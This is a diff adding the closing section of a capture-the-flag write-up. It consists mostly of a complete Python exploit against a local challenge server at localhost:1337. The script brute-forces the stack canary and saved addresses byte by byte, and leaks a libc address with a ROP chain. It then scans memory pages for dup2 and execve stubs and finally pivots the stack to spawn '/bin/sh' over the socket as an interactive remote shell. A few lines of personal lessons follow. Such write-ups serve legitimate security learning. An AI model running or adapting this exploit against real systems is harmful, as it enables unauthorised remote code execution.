@@ -758,4 +758,367 @@ Note: one loop for scanning down, same loop for scanning up - yeah I know it's t
 
 That's it, we have all of the information we need. Now we just construct the payload with the ROP chain, place a "/bin/sh" string on the stack and plug that to the `execve` which we will execute at the end of it:
 
+The last part of the exploit looks like this:
+```python
+# Final payload for remote shell
+payload = "davide" + "AA"  # address of that is buffer_start_addr
 
+# close(0)
+payload += p64(gadget_pop_rdi_ret ^ Ds)  # first, we ret here <---- (
+payload += p64(0x0 ^ Ds)                 # pop this to RDI
+payload += p64(text_section_close_plt ^ Ds)           # ret there
+
+# close(1)
+payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
+payload += p64(0x1 ^ Ds)                 # pop this to RDI
+payload += p64(text_section_close_plt ^ Ds)           # ret there
+
+# dup2(4,0)
+payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
+payload += p64(0x4 ^ Ds)                 # pop this to RDI (socket's FD)
+payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds) # ret to this gadget
+payload += p64(0x0 ^ Ds)                 # pop rsi
+payload += p64(0xdeadbeefdeadbeef)       # pop r15 (dont care)
+payload += p64(dup2_remote_addr ^ Ds)           # call dup2
+
+# dup2(4,1)
+payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
+payload += p64(0x4 ^ Ds)  # pop this to RDI (socket's FD)
+payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)  # ret to this gadget
+payload += p64(0x1 ^ Ds)  # pop rsi
+payload += p64(0xdeadbeefdeadbeef)  # pop r15 (dont care)
+payload += p64(dup2_remote_addr ^ Ds)  # call dup2
+
+# When back from dup2, load arguments for execve
+payload += p64(gadget_pop_rdi_ret ^ Ds)
+
+stack_bin_sh = buffer_addr + 224  # will be placed in a few line from now
+payload += p64(stack_bin_sh ^ Ds)
+
+# Second argument for execve = NULL
+payload += p64(gadget_pop_rdx_ret ^ Ds)
+payload += p64(0x0 ^ Ds)
+
+# Third argument for execve = NULL
+payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
+payload += p64(0x0 ^ Ds)
+payload += p64(0xdeadbeefdeadbeef ^ Ds)
+
+# jump to execve
+payload += p64((gadget_pop_rdx_ret + 1) ^ Ds)
+payload += p64(execve_remote_addr ^ Ds)
+
+
+# place /bin/sh on the stack 
+payload += "".join([chr(ord(t) ^ 0xd) for t in "/bin/sh"])
+payload += chr(0x0 ^ 0xd)  # terminating null
+
+# Pad to the end of buffer
+payload += "B" * (1032 - len(payload))
+payload += p64(canary ^ Ds)
+payload += p64(buffer_addr ^ Ds)
+payload += p64(text_section_leave_ret ^ Ds)
+
+sock = socket.socket()
+sock.connect(SERVER)
+sock.recv(4096)  # server hello
+sock.send(payload)
+#interactive mode
+t = Telnet()
+t.sock = sock
+print "Starting interactive session:"
+t.interact()
+sock.close()
+```
+Note: to use an interactive mode for the shell I used `from telnetlib import Telnet` to make it easier to interact with the server once I have shell.
+
+Final script:
+```python
+import socket
+import struct
+from telnetlib import Telnet
+
+Ds = 0x0d0d0d0d0d0d0d0d
+
+def p64(s):
+    return struct.pack("Q", s)
+
+def unpack(s):
+    return struct.unpack("Q", s)[0]
+
+SERVER = ("localhost", 1337)
+
+def send_payload(p):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(SERVER)
+    s.recv(4096)
+    s.send(p)
+
+    res = False
+    try:
+        line = s.recv(4096)
+        res = "Username found!" in line
+
+    finally:
+        s.close()
+
+    return res
+
+def leak_next_byte(prefix):
+    for test_byte in [chr(t) for t in range(256)]:
+        if send_payload(prefix + test_byte):
+            print "Found:", hex(ord(test_byte))
+            return prefix + test_byte
+
+def leak_n_bytes(prefix, n):
+    payload = prefix
+    for i in range(n):
+        payload = leak_next_byte(payload)
+    return unpack(payload[-8:]) ^ Ds
+
+
+def main():
+    payload = "davide"
+    payload += "B" * (1032 - len(payload))
+
+    print "Leaking canary", 
+    canary = leak_n_bytes(payload, 8)
+    print "{}".format(hex(canary))
+
+    print "Leaking old RBP"
+    old_rbp = leak_n_bytes(payload + p64(canary ^ Ds) , 8)
+    print "{}".format(hex(old_rbp))
+
+    print "Leaking return address"
+    ret_addr = leak_n_bytes(payload + p64(canary ^ Ds) + p64(old_rbp ^ Ds) + chr(ord("\xcf") ^ 0xd), 7)
+    print "{}".format(hex(ret_addr))
+
+    text_section_base = ret_addr & 0xfffffffffffff000
+    text_section_leave_ret = text_section_base + 0xc5c
+    buffer_addr       = old_rbp - 0x480
+
+    gadget_pop_rsi_pop_r15_ret = text_section_base + 0xf71
+    gadget_pop_rdi_ret         = text_section_base + 0xf73
+    gadget_pop_rdx_ret         = text_section_base + 0xb53
+
+    text_section_write_got = text_section_base + 0x202020
+    text_section_write_plt = text_section_base + 0x910
+
+    # After leaking the necessary values,
+    # We create a new payload
+    payload = "davide" + "AA"
+
+    payload += p64(gadget_pop_rdi_ret ^ Ds)
+    payload += p64(0x4 ^ Ds)
+    payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
+    payload += p64(text_section_write_got ^ Ds)
+    payload += p64(0x1337)   # pop r15, dont-care
+    payload += p64(gadget_pop_rdx_ret ^ Ds)
+    payload += p64(0x8 ^ Ds)
+    payload += p64(text_section_write_plt ^ Ds)
+
+
+    # Pad to the end of buffer
+    payload += "B" * (1032 - len(payload))
+
+    payload += p64(canary ^ Ds)
+    payload += p64(buffer_addr ^ Ds)
+    payload += p64(text_section_leave_ret ^ Ds)
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(SERVER)
+    s.recv(4096)  # server hello
+    s.send(payload)
+
+    write_libc = s.recv(8)
+    print "write@libc:", hex(unpack(write_libc))
+    s.close()
+
+    # Libc scan
+    libc_page = unpack(write_libc) & 0xfffffffffffff000
+    page_size = 0x1000
+    dup2_start      = "".join([chr(t) for t in [0xb8,	0x21,	0x00,	0x00,	0x00,	0x0f,	0x05]])
+    execve_start    = "".join([chr(t) for t in [0xb8,	0x3b,	0x00,	0x00,	0x00,	0x0f,	0x05]])
+
+    dup2_remote_addr = 0
+    execve_remote_addr = 0
+
+    # scan down
+    print "Scanning down"
+    while dup2_remote_addr == 0 or execve_remote_addr == 0:
+        try:
+            payload = "davide" + "AA"
+            payload += p64(gadget_pop_rdi_ret ^ Ds)
+            payload += p64(0x4 ^ Ds)
+            payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
+            payload += p64(libc_page ^ Ds)   # buffer = page
+            payload += p64(0x1337)   # pop r15, dont-care
+            payload += p64(gadget_pop_rdx_ret ^ Ds)
+            payload += p64(page_size ^ Ds)  # length
+            payload += p64(text_section_write_plt ^ Ds)
+            # Pad to the end of buffer
+            payload += "B" * (1032 - len(payload))
+            payload += p64(canary ^ Ds)
+            payload += p64(buffer_addr ^ Ds)
+            payload += p64(text_section_leave_ret ^ Ds)
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(SERVER)
+            s.recv(4096)  # server hello
+            s.send(payload)
+
+            page_data = s.recv(page_size)
+            if len(page_data) == 0:
+                break
+
+            if dup2_start in page_data:
+                dup2_remote_addr = libc_page + page_data.index(dup2_start)
+                print "Found dup2 @ {}".format(hex(dup2_remote_addr))
+
+            
+            if execve_start in page_data:
+                execve_remote_addr = libc_page + page_data.index(execve_start)
+                print "Found execve @ {}".format(hex(execve_remote_addr))
+
+
+            s.close()
+            libc_page -= page_size  # scan down
+
+        except EOFError:
+            break
+
+
+    # scan up
+    print "scanning up"
+    libc_page = unpack(write_libc) & 0xfffffffffffff000
+    while dup2_remote_addr == 0 or execve_remote_addr == 0:
+        try:
+            payload = "davide" + "AA"
+            payload += p64(gadget_pop_rdi_ret ^ Ds)
+            payload += p64(0x4 ^ Ds)
+            payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
+            payload += p64(libc_page ^ Ds)   # buffer = page
+            payload += p64(0x1337)   # pop r15, dont-care
+            payload += p64(gadget_pop_rdx_ret ^ Ds)
+            payload += p64(page_size ^ Ds)  # length
+            payload += p64(text_section_write_plt ^ Ds)
+            # Pad to the end of buffer
+            payload += "B" * (1032 - len(payload))
+            payload += p64(canary ^ Ds)
+            payload += p64(buffer_addr ^ Ds)
+            payload += p64(text_section_leave_ret ^ Ds)
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(SERVER)
+            s.recv(4096)  # server hello
+            s.send(payload)
+
+            page_data = s.recv(page_size)
+            if len(page_data) == 0:
+                break
+
+            if dup2_start in page_data:
+                dup2_remote_addr = libc_page + page_data.index(dup2_start)
+                print "Found dup2 @ {}".format(hex(dup2_remote_addr))
+
+            
+            if execve_start in page_data:
+                execve_remote_addr = libc_page + page_data.index(execve_start)
+                print "Found execve @ {}".format(hex(execve_remote_addr))
+
+
+            s.close()
+            libc_page += page_size  # scan down
+        except EOFError:
+            break
+
+    print "libc scan over"
+    text_section_close_plt = text_section_base + 0x960
+
+
+    # Final payload for remote shell
+    payload = "davide" + "AA"  # address of that is buffer_start_addr
+
+    # close(0)
+    payload += p64(gadget_pop_rdi_ret ^ Ds)  # first, we ret here <---- (
+    payload += p64(0x0 ^ Ds)                 # pop this to RDI
+    payload += p64(text_section_close_plt ^ Ds)           # ret there
+
+    # close(1)
+    payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
+    payload += p64(0x1 ^ Ds)                 # pop this to RDI
+    payload += p64(text_section_close_plt ^ Ds)           # ret there
+
+    # dup2(4,0)
+    payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
+    payload += p64(0x4 ^ Ds)                 # pop this to RDI (socket's FD)
+    payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds) # ret to this gadget
+    payload += p64(0x0 ^ Ds)                 # pop rsi
+    payload += p64(0xdeadbeefdeadbeef)       # pop r15 (dont care)
+    payload += p64(dup2_remote_addr ^ Ds)           # call dup2
+
+    # dup2(4,1)
+    payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
+    payload += p64(0x4 ^ Ds)  # pop this to RDI (socket's FD)
+    payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)  # ret to this gadget
+    payload += p64(0x1 ^ Ds)  # pop rsi
+    payload += p64(0xdeadbeefdeadbeef)  # pop r15 (dont care)
+    payload += p64(dup2_remote_addr ^ Ds)  # call dup2
+
+    # When back from dup2, load arguments for execve
+    payload += p64(gadget_pop_rdi_ret ^ Ds)
+
+    stack_bin_sh = buffer_addr + 224  # will be placed in a few line from now
+    payload += p64(stack_bin_sh ^ Ds)
+
+    # Second argument for execve = NULL
+    payload += p64(gadget_pop_rdx_ret ^ Ds)
+    payload += p64(0x0 ^ Ds)
+
+    # Third argument for execve = NULL
+    payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
+    payload += p64(0x0 ^ Ds)
+    payload += p64(0xdeadbeefdeadbeef ^ Ds)
+
+    # jump to execve
+    payload += p64((gadget_pop_rdx_ret + 1) ^ Ds)
+    payload += p64(execve_remote_addr ^ Ds)
+
+
+    # place /bin/sh on the stack 
+    payload += "".join([chr(ord(t) ^ 0xd) for t in "/bin/sh"])
+    payload += chr(0x0 ^ 0xd)  # terminating null
+
+    # Pad to the end of buffer
+    payload += "B" * (1032 - len(payload))
+    payload += p64(canary ^ Ds)
+    payload += p64(buffer_addr ^ Ds)
+    payload += p64(text_section_leave_ret ^ Ds)
+
+    sock = socket.socket()
+    sock.connect(SERVER)
+    sock.recv(4096)  # server hello
+    sock.send(payload)
+    #interactive mode
+    t = Telnet()
+    t.sock = sock
+    print "Starting interactive session:"
+    t.interact()
+    sock.close()
+
+
+
+if __name__ == "__main__":
+    main()
+```
+
+
+### Note to self
+
+This challenge was more difficult than I've expected. I thought that I have pretty much have seen it all when it comes to pwn challenges and everything I would encounter is just more complex programs... I was wrong!
+
+* The frame pointer on the stack, usually ignored, can be very important when you do not have enough bytes to override past the buffer! understanding the `leave` instruction and stack pivoting turns out to be very helpful here
+
+* Not finding the leaked libc address in the databases was very frustrating... but then again, this could happen in the real world - I guess sometimes you encounter library versions and small modifications that make you come up with creative solutions like scanning the entire thing for gadgets yourself
+
+* Docker, a very cool tool to have that I definitely need to learn more about
